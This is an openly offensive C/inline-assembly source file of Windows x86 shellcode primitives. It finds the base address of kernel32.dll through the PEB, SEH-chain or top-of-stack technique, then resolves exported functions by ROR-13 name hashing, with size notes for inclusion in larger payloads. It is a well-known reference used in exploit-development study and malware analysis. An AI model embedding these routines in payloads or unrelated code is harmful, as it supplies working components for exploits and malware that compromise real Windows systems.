/*
 * Overview
 *
 *    1) Finding kernel32.dll base address VMA
 *    2) Finding functions in dynamic libraries.
 *
 * Method Selection
 * 
 *    To use the PEB technique     : -D USE_KERNEL32_METHOD_PEB (default)
 *    To use the SEH technique     : -D USE_KERNEL32_METHOD_SEH
 *    To use the TOPSTACK technique: -D USE_KERNEL32_METHOD_TOPSTACK
 *
 *    To use Windows NT-based only : -D USE_WINNT_ONLY
 *    To eliminate register saves  : -D DISABLE_REGISTER_SAVES
 *    To use inline                ; -D USE_INLINE
 *    To resolve a singular hash   : -D USE_SINGULAR_HASH
 *
 * Notes
 *
 *    Each of these methods are not guaranteed to work.  The PEB technique
 *    is definitely the most likely to work.  The only time it would fail
 *    is if someone is intentionally trying to break shellcode that uses it
 *    or Microsoft changes something.  The SEH is the second most likely,
 *    however, it will fail under scenarios where the last handler does not
 *    point into kernel32.  The TOPSTACK technique can fail if under some 
 *    circumstance the 0x1c offset into the stack does not contain a pointer
 *    into kernel32.  I know of no scenarios where this happens, but it is,
 *    in theory, possible.  Lastly, both the SEH and TOPSTACK methods will
 *    fail if the characters 'MZ' exist at the base of a 64k aligned page 
 *    boundary that does not actually denote the base of the image.
 *
 * Optimizations
 *
 *    These functions preserve registers as much as possible so that they
 *    can be plugged in easily.  If you need to reduce the size you can 
 *    remove some of the register saving instructions.  In some cases this 
 *    can save as many as 4 bytes.
 *
 * Credits
 *
 *    1) Dino Dai Zovi's PEB resolution and function resolution techniques
 *    2) Skywing@freenode and vizzini@freenode for ideas and optimizations 
 *       on the SEH technique
 *    3) optyx for optimizing with me on the top stack technique
 *
 * This file is generally meant to be included in other files.
 *
 * skape
 * mmiller@hick.org
 */

#ifdef DEBUG
int main()
{
#endif

#ifdef USE_ASM_BLOCK
__asm
{
#endif

#if defined(USE_KERNEL32_METHOD_SEH)

	/*
	 * find_kernel32 -- SEH
	 *
	 * size     : 33 bytes
	 * method   : Walk the list of SEH handlers until we find the last one.
	 *            From there we walk down in 64k blocks until we hit the top of 
	 *            kernel32.
	 * targets  : 95/98/ME/NT/2K/XP
	 * arguments: none
	 * return   : eax (kernel32.dll base address)
	 * clobbers : eax
	 */
	find_kernel32:
#ifndef DISABLE_REGISTER_SAVES
		push esi                      // Save esi
		push ecx                      // Save ecx
#endif
		xor  ecx, ecx                 // Zero ecx
		mov  esi, fs:[ecx]            // Snag our SEH entry
		not  ecx                      // Set ecx to 0xffffffff
	find_kernel32_seh_loop:
		lodsd                         // Load the memory in esi into eax
		mov  esi, eax                 // Use this eax as our next pointer for esi
		cmp  [eax], ecx               // Is the next-handler set to 0xffffffff?
		jne  find_kernel32_seh_loop   // Nope, keep going.  Otherwise, fall through.
	find_kernel32_seh_loop_done:
		mov  eax, [eax + 0x04]	      // Snag the function handler address in eax

	find_kernel32_base:
	find_kernel32_base_loop: 
		dec  eax                      // Subtract to our next page
		xor  ax, ax                   // Zero the lower half
		cmp  word ptr [eax], 0x5a4d   // Is this the top of kernel32?
		jne  find_kernel32_base_loop  // Nope?  Try again.
	find_kernel32_base_finished:
#ifndef DISABLE_REGISTER_SAVES
		pop  ecx                      // Restore ecx
		pop  esi                      // Restore esi
#endif
#ifndef USE_INLINE
		ret                           // Return
#endif

#elif defined(USE_KERNEL32_METHOD_TOPSTACK)

	/*
	 * find_kernel32 -- top stack
	 *
	 * size     : 25 bytes
	 * method   : Extract the top of the stack from the TEB.
	 *            0x1c bytes into the stack should hold a vma
	 *            that is inside kernel32.dll.  Grab it and
	 *            walk down in 64k chunks until we hit the top
	 *            of kernel32.dll.
	 * targets  : NT/2K/XP
	 * arguments: none
	 * return   : eax (kernel32.dll base address)
	 * clobbers : eax
	 */
	find_kernel32:
#ifndef DISABLE_REGISTER_SAVES
		push esi                      // Save esi
#endif
		xor  esi, esi                 // Zero esi
		mov  esi, fs:[esi + 0x18]     // Extract TEB
		lodsd                         // Grab a pointer we don't need
		lodsd                         // Grab the top of the stack for this thread
		mov  eax, [eax - 0x1c]        // Snag a function pointer that's 0x1c bytes into the stack

	find_kernel32_base:
	find_kernel32_base_loop: 
		dec  eax                      // Subtract to our next page
		xor  ax, ax                   // Zero the lower half
		cmp  word ptr [eax], 0x5a4d   // Is this the top of kernel32?
		jne  find_kernel32_base_loop  // Nope?  Try again.
	find_kernel32_base_finished:
#ifndef DISABLE_REGISTER_SAVES
		pop  esi                      // Restore esi
#endif
#ifndef USE_INLINE
		ret                           // Return
#endif
	
#else // Default method

	/*
	 * find_kernel32 -- PEB
	 *
	 * size     : 34 bytes
	 * method   : Lookup the PEB and walk one node back in the loaded
	 *            module list.  Extract the base address from this entry.
	 *            It should point to kernel32.dll.
	 * targets  : 95/98/ME/NT/2K/XP
	 * arguments: none
	 * return   : eax (kernel32.dll base address)
	 * clobbers : eax
	 */
	find_kernel32:
#ifndef DISABLE_REGISTER_SAVES
		push  esi                     // Save esi
#endif
		xor   eax, eax
		mov   eax, fs:[eax+0x30]      // Extract the PEB
#ifndef USE_WINNT_ONLY
		test  eax, eax                // Check for Windows 9x
		js    find_kernel32_9x        // If signed short, jump to windows 9x lookup
#endif
	find_kernel32_nt:
		mov   eax, [eax + 0x0c]       // Extract the PROCESS_MODULE_INFO pointer from the PEB
		mov   esi, [eax + 0x1c]       // Get the address of flink in the init module list
		lodsd                         // Load the address of blink into eax
		mov   eax, [eax + 0x8]        // Grab the module base address from the list entry
#ifndef USE_WINNT_ONLY
		jmp   find_kernel32_finished  // Fall down to the bottom
	find_kernel32_9x:
		mov   eax, [eax + 0x34]       // Undocumented offset (0x34)
		lea   eax, [eax + 0x7c]       // Load the address of eax+0x7c to keep us in signed byte range
		mov   eax, [eax + 0x3c]       // Undocumented offset (0xb8)
	find_kernel32_finished:
#endif
#ifndef DISABLE_REGISTER_SAVES
		pop   esi                     // Restore esi
#endif
#ifndef USE_INLINE
		ret                           // Return
#endif

#endif

	/*
	 * find_function
	 *
	 * method   : Walks the export list of the given image
	 *            until it finds a symbol whose hashed name
	 *            matches the one that was passed in.
	 * targets  : 95/98/ME/NT/2K/XP
	 * arguments: [esp + 0x24] (library base address)
	 *            [esp + 0x28] (function hash)
	 * return   : eax (resultant function address)
	 * clobbers : eax
	 */
	find_function:
#ifndef DISABLE_REGISTER_SAVES
		pushad                        // Save all registers
	#ifdef USE_INLINE
		mov   ebp, eax                // Take the base address of kernel32 and put it in ebp
	#else
		mov   ebp, [esp + 0x24]       // Store the base address in eax
	#endif
#else
	#ifdef USE_INLINE
		mov   ebp, eax                // Take the base address of kernel32 and put it in ebp
	#else
		mov   ebp, [esp + 0x4]        // Store the base address in eax if non-inline
	#endif
#endif
		mov   eax, [ebp + 0x3c]       // PE header VMA
		mov   edx, [ebp + eax + 0x78] // Export table relative offset
		add   edx, ebp                // Export table VMA
		mov   ecx, [edx + 0x18]       // Number of names
		mov   ebx, [edx + 0x20]       // Names table relative offset
		add   ebx, ebp                // Names table VMA
	find_function_loop:
		jecxz find_function_finished  // Jump to the end if ecx is 0
		dec   ecx                     // Decrement our names counter
		mov   esi, [ebx + ecx * 4]    // Store the relative offset of the name
		add   esi, ebp                // Set esi to the VMA of the current name 
	compute_hash:
		xor   edi, edi                // Zero edi
		xor   eax, eax                // Zero eax
		cld                           // Clear direction
	compute_hash_again:
		lodsb                         // Load the next byte from esi into al
		test  al, al                  // Test ourselves.
		jz    compute_hash_finished   // If the ZF is set, we've hit the null term.
		ror   edi, 0xd                // Rotate edi 13 bits to the right
		add   edi, eax                // Add the new byte to the accumulator
		jmp   compute_hash_again      // Next iteration
	compute_hash_finished:         
	find_function_compare:           
#ifdef USE_INLINE
	#ifdef USE_SINGULAR_HASH  
		cmp   edi, USE_SINGULAR_HASH  // Compare it to a specific hash
	#else
		cmp   edi, [esp + 0x8]        // Compare the computed hash with the requested hash
	#endif
#else
	#ifdef USE_SINGULAR_HASH
		cmp   edi, USE_SINGULAR_HASH  // Compare it to a specific hash
	#else
		cmp   edi, [esp + 0x28]       // Compare the computed hash with the requested hash
	#endif
#endif
		jnz   find_function_loop      // No match, try the next one.
		mov   ebx, [edx + 0x24]       // Ordinals table relative offset
		add   ebx, ebp                // Ordinals table VMA
		mov   cx, [ebx + 2 * ecx]     // Extrapolate the function's ordinal
		mov   ebx, [edx + 0x1c]       // Address table relative offset
		add   ebx, ebp                // Address table VMA
		mov   eax, [ebx + 4 * ecx]    // Extract the relative function offset from its ordinal
		add   eax, ebp                // Function VMA
#ifndef DISABLE_REGISTER_SAVES
		mov   [esp + 0x1c], eax       // Overwrite stack version of eax from pushad
	find_function_finished:
		popad                         // Restore all registers
#else
	find_function_finished:
#endif
#ifndef USE_INLINE
		ret                           // Return
#endif

#ifdef USE_ASM_BLOCK
}
#endif

#ifdef DEBUG
}
#endif
